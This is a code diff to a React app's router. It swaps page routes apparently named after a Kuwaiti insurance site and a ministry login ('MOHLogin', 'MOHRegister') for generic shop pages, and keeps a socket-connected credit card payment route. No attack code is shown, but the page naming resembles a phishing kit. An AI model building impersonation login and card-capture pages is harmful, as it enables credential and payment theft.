@@ -11,14 +11,17 @@ import { initializeSocket, disconnectSocket, socket } from "./lib/store";
 import AmerChat from "./components/AmerChat";
 
 // Main Pages (Vehicle Inspection)
-import KuwaitInsuranceHome from "./pages/KuwaitInsuranceHome";
-import MOHLogin from "./pages/MOHLogin";
-import MOHRegister from "./pages/MOHRegister";
-import MOHCreateAccount from "./pages/MOHCreateAccount";
+import Index from "./pages/Index";
+import Cart from "./pages/Cart";
+import Checkout from "./pages/Checkout";
+import Products from "./pages/Products";
+
+
+
 
 
 // Form Pages
-import SummaryPayment from "./pages/SummaryPayment";
+
 
 // Payment Pages
 import CreditCardPayment from "./pages/CreditCardPayment";
@@ -40,14 +43,17 @@ function Router() {
   return (
     <Switch>
       {/* Main Pages */}
-      <Route path={"/"} component={KuwaitInsuranceHome} />
-      <Route path={"/moh-login"} component={MOHLogin} />
-      <Route path={"/moh-register"} component={MOHRegister} />
-      <Route path={"/moh-create-account"} component={MOHCreateAccount} />
+      <Route path={"/"} component={Index} />
+      <Route path={"/cart"} component={Cart} />
+      <Route path={"/checkout"} component={Checkout} />
+      <Route path={"/products"} component={Products} />
+      
+      
+      
 
 
       {/* Form Routes */}
-      <Route path={"/summary-payment"} component={SummaryPayment} />
+      
 
       {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
